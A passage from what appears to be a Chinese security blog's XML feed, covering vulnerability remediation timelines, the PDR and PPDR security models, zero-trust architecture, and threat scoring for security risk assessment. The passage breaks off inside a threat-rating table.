title="漏洞跟进及修复"></a>漏洞跟进及修复</h3><p>根据漏洞等级设定的时效性，设置修复计划时间，漏洞复验时间，在漏洞管理系统中进行管理和跟进。漏洞修复人修复完成后提交安全工程师进行漏洞复验，验证漏洞是否确实已经修复。如果漏洞在目前的技术条件下确实无法修复，提交系统负责进行风险确认，采取其他规避风险的措施，如调整访控策略、下线等。</p><h3 id="漏洞修复周期"><a href="#漏洞修复周期" class="headerlink" title="漏洞修复周期"></a>漏洞修复周期</h3><p>漏洞修复周期，包括漏洞的验证、评估、分发、复验、修复和关闭的各个环节。漏洞的修复周期，会根据漏洞等级确定。<br>参考如下：</p><table><thead><tr><th>漏洞等级</th><th>漏洞确认时间</th><th>漏洞修复时间</th></tr></thead><tbody><tr><td>超危（严重）</td><td>12小时</td><td>24小时</td></tr><tr><td>高危</td><td>24小时</td><td>3*24小时</td></tr><tr><td>中危</td><td>36小时</td><td>7*24小时</td></tr><tr><td>低危</td><td>72小时</td><td>14*24小时</td></tr></tbody></table><h3 id="漏洞数据分析"><a href="#漏洞数据分析" class="headerlink" title="漏洞数据分析"></a>漏洞数据分析</h3><p>对于漏洞管理整个流程来说，漏洞缓解或已解决后，关闭工单不是最终的目的，需要对漏洞数据进行分析，持续运营，可以从以下几个方面考虑：<br>1）统计一段时间内，外网系统出现的次数最多的Top10漏洞排名，分析漏洞出现的原因；<br>如外网系统中出现多次SQL注入漏洞，可以检查WAF的规则库是否及时更新？规则是否生效？此外网系统是否在WAF的防护之内？对外的系统为何不做严格的字符过滤机制等。<br>2）统计一段时间内，自主开发系统中漏洞数量最多的Top10系统排名，分析造成的原因；<br>如弱口令次数过多，是安全意识宣传不够？研发人员不重视？<br>3）哪些供应商的开发的系统漏洞数量最多？分析存在的原因；<br>是否需要约谈供应商沟通，是安全开发能力的问题，还是研发安全意识不够？<br>4）哪些框架被利用造成的漏洞过多？<br>是情报问题？还是应急响应机制的原因？是否可以替换为其他框架？</p><hr><p>参考资料<br>信息安全技术 安全漏洞分类 GBT 33561-2017<br>信息安全技术 安全漏洞标识与描述规范 GB∕T 28458-2012<br>信息安全技术 安全漏洞等级划分指南 GB∕T 30279-2013<br>信息安全技术 信息安全漏洞管理规范 GB/T 30276-2013<br>安惞《浅谈企业内部安全漏洞的运营（一）：规范化》</p><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全之基于时间的安全模型（PDR和PPDR模型）</title>
      <link href="/posts/5156b28b/"/>
      <url>/posts/5156b28b/</url>
      
        <content type="html"><![CDATA[<p>基于时间的安全模型是基于”<strong>任何安全防护措施都是基于时间的，超过该时间段，这种防护措施是可能被攻破的</strong>“这样的前提。该模型主要给出了信息系统的攻防时间表。攻击时间指的是在系统采取某种防守措施，通过不同的攻击手段来计算攻破该防守措施所需要的时间。防守时间指的是，对于某种固定攻击手法，通过采取不同的安全防护措施，来计算该防护措施所能坚守的时间。</p><p>基于时间的安全模型主要包括PDR和后来改进的PPDR模型，PDR模型是源自美国国际互联网安全系统公司ISS提出的自适应网络安全模型ANSM（AdaptiveNetwork Security Model），是一个可量化、可数学证明、基于时间的安全模型。美国ISS公司（后被IBM收购）提出的。PPDR模型是PDR的模型上发展起来的，也称P2DR，加入的P是Policy策略。</p><h2 id="一、PDR模型"><a href="#一、PDR模型" class="headerlink" title="一、PDR模型"></a>一、PDR模型</h2><p>保护-检测-响应( Protection-Detection-Response, PDR )模型是信息安全保障工作中常用的模型，是最早体现主动防御思想的一种网络安全模型，其思想是承认信息系统中漏洞的存在，正视信息系统面临的威胁，通过采取适度防护、加强检测工作、落实对安全事件的响应、建立对威胁的防护来保障系统的安全。<br>模型图如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220423/PDR.png" alt="PDR模型"></p><p>P-protection，保护就是采用一切可能的措施来保护网络、系统以及信息的安全。通常采用的技术及方法主要包括加密、认证、访问控制、防火墙及防病毒等。</p><p>D-detect，检测可以了解和评估网络和系统的安全状态，为安全防护和安全响应提供依据。常用的检测技术主要包括入侵检测、漏洞检测及网络扫描等技术。</p><p> R-response，应急响应在安全模型中占有重要地位，是解决安全问题的最有效办法。解决安全问题就是解决紧急响应和异常处理问题，因此，建立应急响应机制，形成快速安全响应的能力，对网络和系统至关重要。</p><p>PDR模型直观、实用，建立了一个所谓的基于时间的可证明的安全模型，定义了防护时间Pt(攻击者发起攻击时，保护系统不被攻破的时间)、检测时间Dt(从发起攻击到检测到攻击的时间)和响应时间Rt(从发现攻击到做出有效响应的时间)3个概念，并给出了评定系统安全的计算方式，<strong>当Pt&gt;Dt+Rt时，即认为系统是安全的</strong>，也就是说，如果在攻击者攻破系统之前发现并阻止了攻击的行为，那么系统就是安全的。</p><p>局限性：系统的Pt、Dt、Rt 很难准确定义，面对不同攻击者和不同种类的攻击，这些时间都是变化的，其实还是不能有效证明-一个系统是否安全。并且该模型对系统的安全隐患和安全措施采取相对固定的前提假设，难于适应网络安全环境的快速变化。</p><h2 id="二、PPDR模型"><a href="#二、PPDR模型" class="headerlink" title="二、PPDR模型"></a>二、PPDR模型</h2><p>策略-保护检测-响应模型( Policy-Protection-Detection-Response, PPDR )是在PDR模型的基础_上发展出来的模型，也称为P2DR模型。模型的核心思想是所有的防护、检测、响应都是依据安全策略实施的，模型包括4个主要部分: Policy (策略)、Protection ( 保护)、Detection(检测)和Response(响应)。<br>模型图如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220423/PPDR.png" alt="PPDR模型"></p><p>策略（Policy）：模型的核心，所有的防护、检测和响应都是依据安全策略实施的。安全策略一般由总体安全策略和具体安全策略两部分组成。<br>保护（Protection）：保护是根据系统可能出现的安全问题而采取的预防措施，这些措施通过传统的静态安全技术实现。采用的防护技术通常包括数据加密、身份认证、访问控制、授权和虚拟专用网(VPN)技术、防火墙、安全扫描和数据备份等。<br>检测（Detection）：当攻击者穿透防护系统时，检测功能就发挥作用，与防护系统形成互补。检测是动态响应的依据。<br>响应（Response）：系统一旦检测到人侵，响应系统就开始工作，进行事件处理。响应包括应急响应和恢复处理，恢复处理又包括系统恢复和信息恢复。</p><p>PPDR模型是在整体的安全策略的控制和指导下，在综合运用防护工具(如防火墙、操作系统身份认证、加密等)的同时，利用检测工具(如漏洞评估、人侵检测等)了解和评估系统的安全状态，通过适当的反应将系统调整到“最安全”和“风险最低”的状态。保护、检测和响应组成了一个完整的、动态的安全循环，在安全策略的指导下保证信息系统的安全。</p><p>该理论的最基本原理就是信息安全相关的所有活动，不管是攻击行为、防护行为、检测行为和响应行为等都要消耗时间,因此可以用时间来衡量一个体系的安全性和安全能力。假设系统的防护、检测和反应时间分别是Pt、Dt和Rt。系统被对手成功攻击后的时间为暴露时间(Et)，那么PPDR模型就可以用典型的数学公式来表达安全的要求：如果Pt&gt;Dt+Rt,那么系统是安全的。</p><p>P2DR模型中的数学法则：<br>假设S系统的防护、检测和反应的时间分别是<br>• Pt（防护时间、有效防御攻击的时间）<br>• Dt（检测时间、发起攻击到检测到的时间）<br>• Rt（反应时间、检测到攻击到处理完成时间）<br> 假设系统被对手成功攻击后的时间为<br>• Et（暴露时间）<br>则该系统防护、检测和反应的时间关系如下：<br>• 如果Pt＞Dt＋Rt，那么S是安全的；<br>• 如果Pt＜Dt＋Rt，那么Et＝（Dt＋Rt）－Pt。</p><p>PPDR给出了安全的全新定义：“<strong>及时的检测和响应就是安全</strong>”，”<strong>及时的检测和恢复就是安全</strong>”。这样的定义给出了解决安全问题的明确方向:提高系统的防护时间Pt，降低检测时间Dt和响应时间Rt。</p><p>与PDR模型相比，PPDR模型更强调控制和对抗，即强调系统安全的动态性，并且以安全检测、漏洞监测和自适应填充“安全间隙”为循环来提高网络安全。值得指出的是，在PPDR模型中，考虑了管理因素,它强调安全管理的持续性、安全策略的动态性，以实时监视网络活动、发现威胁和弱点来调整和填补网络漏洞。另外，该模型强调检测的重要性，通过经常对信息系统的评估把握系统风险点，及时弱化甚至消除系统的安全漏洞。但该模型忽略了内在的变化因素，如人员的流动、人员的素质和策略贯彻的不稳定性。系统本身安全能力的增强、系统和整个网络的优化，以及人员在系统中最重要角色的素质提升，都是该安全系统没有考虑到的问题。</p><table><thead><tr><th></th><th>PDR</th><th>PPDR</th></tr></thead><tbody><tr><td>意义</td><td>最早体现主动防御思想的一种网络安全模型</td><td>是动态网络是安全体系的代表模型，动态安全模型的雏形。</td></tr><tr><td>组成</td><td>保护-检测-响应( Protection-Detection-Response, PDR )</td><td>策略-保护检测-响应模型( Policy-Protection-Detection-Response, PPDR )</td></tr><tr><td>特点</td><td>PDR模型建立了一个所谓的基于时间的可证明的安全模型，定义了:防护时间Pt (黑客发起攻击时，保护系统不被攻破的时间)、检测时间Dt (从发起攻击到检测到攻击的时间)和响应时间Rt (从发现攻击到作出有效响应的时间)。当Pt&gt;Dt+Rt时，即认为系统是安全的，也就是说，如果在黑客攻破系统之前发现并阻止了黑客的行为，那么系统就是安全的。</td><td>给出了安全一个全新的定义：“及时的检测和响应就是安全”，“及时的检测和恢复就是安全”。而且，这样的定义为安全问题的解决给出了明确的方向：提高系统的防护时间Pt，降低检测时间.Dt和响应时间Rt。</td></tr><tr><td>局限性</td><td>系统的Pt、Dt、Rt 很难准确定义，面对不同攻击者和不同种类的攻击，这些时间都是变化的，其实还是不能有效证明一个系统是否安全。并且该模型对系统的安全隐患和安全措施采取相对固定的前提假设，难于适应网络安全环境的快速变化</td><td>忽略了内在的变化因素，如人员的流动、人员的素质和策略贯彻的不稳定性。系统本身安全能力的增强、系统和整个网络的优化，以及人员在系统中最重要角色的素质提升，都是该安全系统没有考虑到的问题。</td></tr></tbody></table><p>不管是PDR还是PPDR，总体来说还是局限于从技术上考虑信息安全问题。随着信息化的发展，人们越来越意识到信息安全涉及面非常广，除了技术，管理、制度、人员和法律等方面也是信息安全必须考虑的因素，就像一个由多块木块构成的“木桶”，木桶的容量由最短的那块板决定。在处理信息安全问题时，必须全面考虑各方面的因素，任何一个方面的遗漏都有可能形成“短板”。</p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全之零信任</title>
      <link href="/posts/7f2622dc/"/>
      <url>/posts/7f2622dc/</url>
      
        <content type="html"><![CDATA[<h2 id="一、零信任产生的背景"><a href="#一、零信任产生的背景" class="headerlink" title="一、零信任产生的背景"></a>一、零信任产生的背景</h2><p>对于资源的访问保护，传统方式是划分安全区域，不同的安全区域有不同的安全要求。在安全区域之间就形成了网络边界，在网络边界处部署边界安全设备，包括防火墙、IPS、防毒墙、WAF等，对来自边界外部的各种攻击进行防范，以此构建企业网络安全体系，这种传统方式可称为边界安全理念。在边界安全理念中网络位置决定了信任程度，在安全区域边界外的用户默认是不可信的（不安全的），没有较多访问权限，边界外用户想要接入边界内的网络需要通过防火墙、VPN等安全机制；安全区域内的用户默认都是可信的（安全的），对边界内用户的操作不再做过多的行为监测，但是这就在每个安全区域内部存在过度信任（认为是安全的，给予的权限过大）的问题。同时由于边界安全设备部署在网络边界上，缺少来自终端侧、资源侧的数据，且相互之间缺乏联动，对威胁的安全分析是不够全面的，因此内部威胁检测和防护能力不足、安全分析覆盖度不够全面成为了边界安全理念固有的软肋。甚至很多企业只是非常粗粒度的划分了企业内网和外网（互联网），这种风险就更为明显。</p><p>另外，随着云计算、物联网以及移动办公等新技术新应用的兴起，企业的业务架构和网络环境也随之发生了重大的变化，这给传统边界安全理念带来了新的挑战。比如云计算技术的普及带来了物理安全边界模糊的挑战，远程办公、多方协同办公等成为常态带来了访问需求复杂性变高和内部资源暴露面扩大的风险，各种设备（BYOD、合作伙伴设备）、各种人员接入带来了对设备、人员的管理难度和不可控安全因素增加的风险，高级威胁攻击（钓鱼攻击、水坑攻击、0day漏洞利用等）带来了边界安全防护机制被突破的风险，这些都对传统的边界安全理念和防护手段，如部署边界安全设备、仅简单认证用户身份、静态和粗粒度的访问控制等提出了挑战，亟需有更好的安全防护理念和解决思路。</p><p>传统边界安全理念先天能力存在不足，新技术新应用又带来了全新的安全挑战，在这样的背景下，零信任的最早雏形源于2004年成立的耶利哥论坛（Jericho Forum ），其成立的使命正是为了定义无边界趋势下的网络安全问题并寻求解决方案，提出要限制基于网络位置的隐式信任；美国国防信息系统局（DISA）为了解决GIG（全球信息栅格，是美军信息化作战规划中极其重要且宏大的基础设施）中，如何实时、动态地对网络进行规划和重构的问题，发起了BlackCore项目，将基于边界的安全模型转换为基于单个事物安全性的模型，并提出了SDP（Software Defined Perimeter）的概念，该概念后来被云安全联盟（Cloud Security Alliance）采纳。2010年，由著名研究机构Forrester的首席分析师John Kindervag最早提出了零信任（Zero Trust）的概念，并由Google在BeyondCorp项目中率先得到了应用，很好的解决了边界安全理念难以应对的安全问题。</p><h2 id="二、零信任的定义"><a href="#二、零信任的定义" class="headerlink" title="二、零信任的定义"></a>二、零信任的定义</h2><p>根据NIST《零信任架构标准》中的定义：零信任（Zero Trust，ZT）提供了一系列概念和思想，在假定网络环境已经被攻陷的前提下，当执行信息系统和服务中的每次访问请求时，降低其决策准确度的不确定性。零信任架构（ZTA）是一种企业网络安全的规划，它基于零信任理念，围绕其组件关系、工作流规划与访问策略构建而成。</p><p>零信任代表了新一代的网络安全防护理念，并非指某种单一的安全技术或产品，其目标是为了降低资源访问过程中的安全风险，防止在未经授权情况下的资源访问，其关键是打破信任和网络位置的默认绑定关系。</p><p>在零信任理念下，网络位置不再决定访问权限，在访问被允许之前，所有访问主体都需要经过身份认证和授权。身份认证不再仅仅针对用户，还将对终端设备、应用软件等多种身份进行多维度、关联性的识别和认证，并且在访问过程中可以根据需要多次发起身份认证。授权决策不再仅仅基于网络位置、用户角色或属性等传统静态访问控制模型，而是通过持续的安全监测和信任评估，进行动态、细粒度的授权。安全监测和信任评估结论是基于尽可能多的数据源计算出来的。</p><p>零信任理念的基本假设、基本原则如下：<br>1、零信任理念的基本假设<br>a) 内部威胁不可避免；<br>b) 从空间上，资源访问的过程中涉及到的所有对象（用户、终端设备、应用、网络、资源等）默认都不信任，其安全不再由网络位置决定；<br>c) 从时间上，每个对象的安全性是动态变化的（非全时段不变的）。<br>2、零信任的基本原则<br>a）任何访问主体（人/设备/应用等），在访问被允许之前，都必须要经过身份认证和授权，避免过度的信任；<br>b）访问主体对资源的访问权限是动态的（非静止不变的）；<br>c）分配访问权限时应遵循最小权限原则；<br>d）尽可能减少资源非必要的网络暴露，以减少攻击面；<br>e）尽可能确保所有的访问主体、资源、通信链路处于最安全状态；<br>f）尽可能多的和及时的获取可能影响授权的所有信息，并根据这些信息进行持续的信任评估和安全响应。</p><p>零信任在所有需要对资源访问进行安全防护的场景都可以使用，但是否采用，应根据企业可接受的安全风险水平和投入综合考虑决定。</p><h2 id="三、零信任技术体系"><a href="#三、零信任技术体系" class="headerlink" title="三、零信任技术体系"></a>三、零信任技术体系</h2><p>目前零信任主要有三大技术体系，分别是<strong>SDP（软件定义安全）</strong>、<strong>IAM（增强身份管理）</strong>和<strong>MSG（微隔离）</strong>。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220421/SIM.png" alt="零信任三大技术体系"></p><h3 id="1、软件定义安全（SDP）"><a href="#1、软件定义安全（SDP）" class="headerlink" title="1、软件定义安全（SDP）"></a>1、软件定义安全（SDP）</h3><p>SDP即“软件定义边界”,是国际云安全联盟CSA于2014年提出的基于零信任(Zero Trust)理念的新一代网络安全模型。SDP在使应用程序所有者能够在需要时部署安全边界,以便将服务与不安全的网络隔离开来。SDP将物理设备替换为在应用程序所有者控制下运行的逻辑组件。SDP仅允许在设备验证和身份验证后访问企业应用程序基础架构。SDP的体系结构由两部分组成:SDP主机和SDP控制器。SDP主机可以发起连接或接受连接。这些操作通过安全控制通道与SDP 控制器交互来管理。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220421/SDP.png" alt="SDP软件定义边界"></p><p>SDP安全优势：<br>1.SDP最大限度地减少攻击面，降低安全风险；<br>2.SDP通过分离访问控制和数据通道来保护关键资产和基础设施，从而防止潜在的基于网络的攻击；<br>3.SDP提供了现有安全设备难以实现的整体集成安全架构。<br>4.SDP提供了一种基于连接的安全体系结构，而不是基于IP的替代方案。由于整个IT环境的爆炸式增长，云环境中缺乏边界使得基于IP的安全性变得脆弱。<br>5.SDP允许对所有连接进行预检查和控制，从这些连接可以连接设备、服务和设施，因此其整体安全性比传统架构更有利。</p><h3 id="2、增强身份管理（IAM）"><a href="#2、增强身份管理（IAM）" class="headerlink" title="2、增强身份管理（IAM）"></a>2、增强身份管理（IAM）</h3><p>增强身份管理IAM是大多数组织实现安全和IT运营策略的核心。它使企业可以自动访问越来越多的技术资产,同时管理潜在的安全和合规风险。身份管理为所有用户,应用程序和数据启用并保护数字身份。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220421/IAM.png" alt="零信任身份与访问管理"></p><p>身份管理可以帮助组织有效解决复杂业务带来的挑战，并平衡四个关键目标：<br>1.加强安全，降低风险。<br>2.提高合规性和审计绩效。<br>3.提供快速有效的业务访问。<br>4.降低运营成本。</p><h3 id="3、微隔离（MSG）"><a href="#3、微隔离（MSG）" class="headerlink" title="3、微隔离（MSG）"></a>3、微隔离（MSG）</h3><p>微隔离是一种网络安全技术，它可以将数据中心在逻辑上划分为各个工作负载级别的不同安全段，然后定义安全控制并为每个唯一段提供服务。微隔离使IT人员可以使用网络虚拟化技术在数据中心内部部署灵活的安全策略,而不必安装多个物理防火墙。微隔离可用于保护每个虚拟机(VM)在具有策略驱动的应用程序级安全控制的企业网络中。微隔离技术可以大大增强企业的抵御能力。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220421/MSG.png" alt="威隔离MSG"></p><p>微隔离是在数据中心和云部署中创建安全区域的一种方法。这种方法使企业组织能够分离工作负载并分别保护它们，从而使网络安全更加完善，从而更加有效。<br>以下是微隔离的一些优点：<br>1.减少攻击面<br>2.提高横向运动的安全性<br>3.安全关键应用<br>4.提高合规性</p><h2 id="四、如何实现零信任体系"><a href="#四、如何实现零信任体系" class="headerlink" title="四、如何实现零信任体系"></a>四、如何实现零信任体系</h2><p>零信任的覆盖范围很广，根据企业的实际情况，可参考如下过程执行逐步建立零信任安全体系。</p><p><strong>1、建立统一的认证平台，提升基础安全及执行能力</strong><br>建立统一的认证能力平台，为所有业务系统提供认证能力。所有业务平台对接认证能力平台以获得中级及以上认证能力，大幅降低因认证方式带来的风险。<br>可结合已经建立的 4A 系统，升级 4A 系统认证体系。使用多因素认证提高安全等级。收集并绑定设备指纹，将每台设备（PC 端或移动 端）与账户关联绑定。通过账号与设备的绑定，实现用 户、账号、设备三位一体的认证体系。建立以零信任网关为核心的控制体系，该方式将大大提高对用户访问行为的控制，弥补现有业务系统在访 控制方面的安全短板。建立采集系统，在用户使用业务系统时，采集行为和环境信息。零信任网关体系可以与 4A 系统和其它业务系统结合，通过代理技术隐藏所有被代理系统的 IP 和端口，并对用户的访问行为进行鉴权检测。</p><p><strong>2、升级或部署EDR，加强终端管控和行为风险发现能力</strong><br>加强客户端监管，可通过升级资产与基线管理平台或部署EDR终端控制接入软件，对终端环境进行基线扫描和检查预警。对于不符合要求的终端，通过统一身份认证平台禁止其接入，同时，给出修复建议。<br>建立大数据处理系统，并通过该系统将上一阶段收集的用户行为信息进行统计和分析，结合电信内部管理规章制度，制定一套有针对性的基础专家规则。同时，建立规则引擎，规则引擎根据专家规则判断用户当前环境和行为风险。如果在规则中缺少必要信息指标，通过调整采集指标达到目标。<br>在基础规则基础上，根据不同的业务系统特点，深入挖掘与业务系统紧密相关的规则。结合认证方式在各个接入了认证能力平台的业务系统中实现自适应处置，使用户体会到初级智能化安全。规则引擎与身份认证系统对接，对接完成后，可以通过对用户访问各个业务系统的检测评估发现潜在风险，主要包括冒名访问和违规操作。</p><p><strong>3、引入智能工具，从传统安全向智慧安全转变</strong><br>建立机器学习平台，引入齐全的人工智能模型和可视化工具，利用前期收集的用户数据，训练适配的模型，建立智能规则引擎，对用户请求的行为信息和环境信息进行自动化评估，关联前期部署的规则引擎，验证并改良智能规则和引擎。通过机器学习平台建立无感知认证模型，作为辅助认证方式进一步提高用户体验，从“有认证”升华至“无认证”。通过大数据和机器学习模型，结合深度挖掘技术建立用户画像库，识别用户行为习惯，践行“行为即指纹”理念，实现“零信任”的终极目标。</p><p>参考资料来源：<br>零信任产业标准工作组《零信任实战白皮书》<br>《零信任架构的3大核心技术》<br>《零信任网络安全》<br>《零信任技术系统规范》</p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全之安全风险管理</title>
      <link href="/posts/88375ea1/"/>
      <url>/posts/88375ea1/</url>
      
        <content type="html"><![CDATA[<p>在信息时代，信息已经成为第一战略资源，信息对组织使命的完成、组织目标的实现起着至关重要的作用，因此信息资产的安全是关系到该组织能否完成其使命的重大因素。资产与风险是对矛盾共同体，资产价值越高，面临的风险就越大。而对于目前的组织机构而言，由于组织的业务运营越来越依赖于信息资产，信息安全相关风险在组织整体风险中所占的比例也越来越高。信息安全风险管理的目的就是将风险控制到可接受的程度，保护信息及其相关资产，最终保障组织能够完成其使命，实现其目标。</p><h2 id="一、什么是安全风险"><a href="#一、什么是安全风险" class="headerlink" title="一、什么是安全风险"></a>一、什么是安全风险</h2><p>风险定义为事态的概率及其结果的组合。风险的目标可能有很多不同的方面，如财务目标、健康和人身安全目标、信息安全目标和环境目标等；目标也可能有不同的级别，如战略目标、组织目标、项目目标、产品目标和过程目标等。风险经常通过引用潜在事态和后果或这些的组合来描述。影响，是对一个预期的偏离，正面的或负面的偏离。<br>风险是客观存在的，与不确定性紧密相连，但又不能完全等同。风险带来的影响，通常都是负面的(正面的影响通常不被称为风险)。风险强调的是损害的潜在可能性，而不是事实上的损害。风险不能消除殆尽，包括人为因素带来的风险，也一样不能消除殆尽。衡量风险的两个基本要素就是事件的概率和影响。<br>威胁利用脆弱性作用于资产产生影响，威胁增加了组织资产的风险，脆弱点能够暴露资产，脆弱性本身不会构成对资产的损害，但是脆弱性被威胁利用就会增加组织资产的风险。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220419/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E5%85%B3%E7%B3%BB.png" alt="安全风险与资产、脆弱性、威胁之间的关系"></p><h2 id="二、如何评估安全风险"><a href="#二、如何评估安全风险" class="headerlink" title="二、如何评估安全风险"></a>二、如何评估安全风险</h2><p>根据《信息安全技术信息安全风险评估规范》（GB/T 20984-2007），对评估对象进行安全风险评估分析，风险分析中涉及评估对象的影响范围、威胁、脆弱性三个基本要素。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220419/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0.png" alt="风险评估"><br>以下参考互联网新技术新业务安全风险评估可以分为<strong>确定影响范围-&gt;确定威胁-&gt;确定脆弱性-&gt;计算分险值-&gt;形成评估结论</strong>，通过定量和定性相结合的方式进行安全风险评估。</p><h3 id="1、确定影响范围"><a href="#1、确定影响范围" class="headerlink" title="1、确定影响范围"></a>1、确定影响范围</h3><p>影响范围是指评估对象涉及的传播影响，按评估对象支持的用户数计。<br>对于运营于互联网上的应用系统，参考下表进行赋值。</p><table><thead><tr><th>范围</th><th>赋值</th></tr></thead><tbody><tr><td>10万以内</td><td>1</td></tr><tr><td>10万-100万以内</td><td>2</td></tr><tr><td>100万-1000万以内</td><td>3</td></tr><tr><td>1000万-5000万以内</td><td>4</td></tr><tr><td>5000万及以上</td><td>5</td></tr></tbody></table><h3 id="2、确定威胁"><a href="#2、确定威胁" class="headerlink" title="2、确定威胁"></a>2、确定威胁</h3><p>威胁是指可能对评估对象造成损害的外部原因。威胁利用评估对象自身的脆弱性，采用一定的途径和方式，对评估对象造成损害或损失，从而形成风险。如：下表为互联网新技术新业务安全评估涉及的威胁及发生可能性赋值。</p><table><thead><tr><th>威胁分类</th><th>威胁名称</th><th>赋值</th><th>威胁描述</th></tr></thead><tbody><tr><td>假冒</td><td>假冒</td><td>4</td><td>通过欺骗通信系统（或用户）达到非法用户冒充成为合法用户，或特权小的用户冒充成为特权大的用户的目的。黑客大多是采用假冒攻击。</td></tr><tr><td>假冒</td><td>诱骗欺诈</td><td>1</td><td>通过伪造、篡改、劫持短信、彩信、邮件、通讯录、通话记录、收藏夹、桌面等方式，诱骗用户，而达到不正当目的。</td></tr><tr><td>假冒</td><td>恶意扣费</td><td>5</td><td>在用户不知情或非授权的情况下，通过隐蔽执行、欺骗用户点击等手段，订购各类收费业务或使用移动终端支付，造成用户经济损失。</td></tr><tr><td>篡改</td><td>篡改</td><td>3</td><td>通过作伪的手段对应用程序的数据、进程、交互内容、发布内容进行修改。</td></tr><tr><td>拒绝服务</td><td>系统破坏</td><td>4</td><td>通过感染、劫持、篡改、删除、终止进程等手段导致移动终端或其它非恶意软件部分或全部功能、用户文件等无法正常使用，干扰、破坏、阻断移动通信网络、网络服务或其它合法业务正常运行。</td></tr><tr><td>拒绝服务</td><td>拒绝服务</td><td>5</td><td>对信息或其他资源的合法访问被无条件地阻止。</td></tr><tr><td>拒绝服务</td><td>资源消耗</td><td>4</td><td>在用户不知情或非授权的情况下，通过自动拨打电话、发送短信、彩信、邮件、频繁连接网络等方式，造成用户资费损失。</td></tr><tr><td>暴力破解</td><td>暴力破解</td><td>2</td><td>一种针对于用户账号和密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止。</td></tr><tr><td>抵赖</td><td>抵赖</td><td>4</td><td>合法用户对自己操作行为否认的可能性。</td></tr><tr><td>越权（提升权限）</td><td>非授权访问</td><td>3</td><td>某一资源被某个非授权的人，或以非授权的方式使用。</td></tr><tr><td>越权（提升权限）</td><td>隐私窃取</td><td>4</td><td>在用户不知情或非授权的情况下，获取涉及用户个人信息。</td></tr><tr><td>越权（提升权限）</td><td>窃听</td><td>3</td><td>用各种可能的合法或非法的手段窃取系统中的信息资源和敏感信息。例如对通信线路中传输的信号搭线监听，或者利用通信设备在工作过程中产生的电磁泄露截取有用信息等。</td></tr><tr><td>越权（提升权限）</td><td>业务流分析</td><td>3</td><td>通过对系统进行长期监听，利用统计分析方法对诸如通信频度、通信的信息流向、通信总量的变化等参数进行研究，从中发现有价值的信息和规律。</td></tr><tr><td>越权（提升权限）</td><td>远程控制</td><td>4</td><td>在用户不知情或非授权的情况下，能够接受远程控制端指令并进行相关操作。</td></tr><tr><td>越权（提升权限）</td><td>破坏信息的完整性/可用性</td><td>4</td><td>数据被非授权地进行增删、修改或破坏而受到损失/数据遗失。</td></tr><tr><td>越权（提升权限）</td><td>授权侵犯（内部攻击）</td><td>3</td><td>被授权以某一目的使用某一系统或资源的某个人，将此权限用于其他非授权的目的。</td></tr><tr><td>非法传播</td><td>恶意传播</td><td>5</td><td>自动通过复制、感染、投递、下载等方式将自身、自身的衍生物或其它恶意代码进行扩散的行为。</td></tr><tr><td>非法传播</td><td>信息泄露</td><td>5</td><td>信息被泄露或透露给某个非授权的实体。</td></tr><tr><td>非法传播</td><td>三涉</td><td>5</td><td>传播的内容与应用包含了非法的信息，如涉黄、涉非、涉政，含病毒等。</td></tr><tr><td>非法传播</td><td>非法应用</td><td>2</td><td>传播内容与应用的方式让用户无法接受，如垃圾短信的发送、骚扰电话等。</td></tr><tr><td>溯源失效</td><td>溯源失效</td><td>4</td><td>无法准确追溯到传播违法有害信息或进行恶意攻击的责任主体。</td></tr><tr><td>管理失控</td><td>管理失控</td><td>4</td><td>用户、业务规模已超过企业最大安全监管能力范围；或企业安全保障能力无法满足针对业务实现方式或功能属性带来安全风险的管理。</td></tr></tbody></table><p>为了便于对不同威胁发生的可能性概率数据进行类比、度量，依据经验或专家意见进行赋值，常用准则参照如下表。采用相对等级的方式进行度量，等级值为1-5，1为最低，5为最高。<br>表：威胁赋值准则</p><table><thead><tr><th>等级</th><th>标识</th><th>定义</th></tr></thead><tbody><tr><td>5</td><td>VH（很高）</td><td>威胁发生的可能性很高，在大多数情况下几乎不可避免或者可以证实发生过的频率较高。</td></tr><